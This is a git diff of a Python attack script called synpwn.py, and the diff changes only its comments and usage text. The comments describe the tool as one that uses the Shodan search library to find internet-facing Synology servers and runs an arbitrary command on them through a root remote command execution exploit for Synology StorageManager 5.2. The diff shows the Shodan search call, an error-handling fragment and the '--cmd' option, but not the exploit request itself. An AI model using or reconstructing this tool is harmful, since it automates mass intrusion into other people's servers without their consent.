@@ -1,9 +1,11 @@
-## Author: LukeBob
-## Python3 script for testing servers the (Synology StorageManager 5.2 - Root Remote Command Execution) https://www.exploit-db.com/exploits/43190/
-## All credit to: (Weibo, SecuriTeam_SSD)
-## 
+#!/usr/bin/env python3
+# Author: LukeBob
+#
+# python3 script for testing the (Synology StorageManager 5.2 - Root Remote Command Execution) exploit found by, (Weibo: SecuriTeam_SSD Twitter: @SecuriTeam_SSD)
+# Uses the shodan library to find the targets running synology and runs specified command given in --cmd param
+# use, "python3 synpwn.py" -h ,for more help
+# For more information on the exploit visit: https://www.exploit-db.com/exploits/43190/
  
-
 import requests
 import argparse
 import shodan
@@ -57,9 +59,7 @@ def exploit(target):
         print(Color.red("[+] Error: ")+" {0}".format(e))
         pass
 
-
-
-## gets targets to
+## itterates through targets printing vulnerable/invulnerable ip,hostname,countryname 
 def search(api):
     try:
         results = api.search("Synology port:80")
@@ -96,17 +96,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
-#usage: synpwn.py [-h] [--key KEY] [--cmd CMD]
-
-#SynPwn, run remote code on Servers running 'Synology StorageManager 5.2'
-
-#optional arguments:
-#  -h, --help  show this help message and exit
-#  --key KEY   Shodan key
-#  --cmd CMD   Command to run on system
-
-#Author's: (Lukebob, Woodsy310)
-
-#C:\Users\Luke\Desktop\factorio-python>
